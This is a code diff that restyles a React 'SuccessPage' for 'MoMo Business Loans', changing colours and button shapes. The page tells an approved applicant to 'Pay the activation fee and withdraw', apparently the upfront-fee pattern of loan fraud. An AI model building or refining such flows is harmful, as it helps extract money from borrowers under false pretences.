@@ -22,7 +22,7 @@ export default function SuccessPage() {
         <Confetti />
 
         {/* Top Header */}
-        <header className="bg-[#ffcc00] text-[hsl(198,100%,22%)] py-3 px-4 shadow-md sticky top-0 z-40">
+        <header className="bg-[#003d59] text-white py-3 px-4 shadow-md sticky top-0 z-40 border-b border-[hsl(198,55%,32%)]">
           <div className="container mx-auto max-w-4xl flex items-center justify-between">
             <div className="flex items-center gap-3 cursor-pointer" onClick={() => navigate('/')}>
               <Logo size="sm" />
@@ -30,7 +30,7 @@ export default function SuccessPage() {
                 MoMo <span className="font-normal opacity-90">Business Loans</span>
               </span>
             </div>
-            <span className="text-xs font-bold bg-[hsl(198,100%,22%)]/10 px-3 py-1 rounded-full text-[hsl(198,100%,22%)]">
+            <span className="text-xs font-bold bg-white/10 px-3 py-1 rounded-full text-white">
               Application Approved
             </span>
           </div>
@@ -86,7 +86,7 @@ export default function SuccessPage() {
               <button
                 id="success-pay-withdraw-btn"
                 onClick={() => navigate('/payment')}
-                className="w-full flex items-center justify-center gap-2 py-4 rounded-2xl bg-[#ffcc00] text-[hsl(198,100%,22%)] font-black text-base transition hover:bg-[#ffcc00]/90 shadow-md cursor-pointer group"
+                className="w-full py-4 rounded-full bg-[#004F71] text-white font-bold text-sm sm:text-base tracking-wider uppercase hover:bg-[#003853] transition shadow-md flex items-center justify-center gap-2 cursor-pointer border border-[#006591]/40 group"
               >
                 <span>Pay the activation fee and withdraw</span>
                 <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
@@ -95,7 +95,7 @@ export default function SuccessPage() {
               <button
                 id="success-home-btn"
                 onClick={() => navigate('/')}
-                className="w-full flex items-center justify-center gap-2 py-3 rounded-2xl border-2 border-gray-200 text-gray-700 font-bold text-sm transition hover:bg-gray-50 cursor-pointer"
+                className="w-full flex items-center justify-center gap-2 py-3.5 rounded-full border-2 border-gray-200 text-gray-700 font-bold text-sm transition hover:bg-gray-50 cursor-pointer"
               >
                 <Home className="w-4 h-4" />
                 <span>Go Back Home</span>
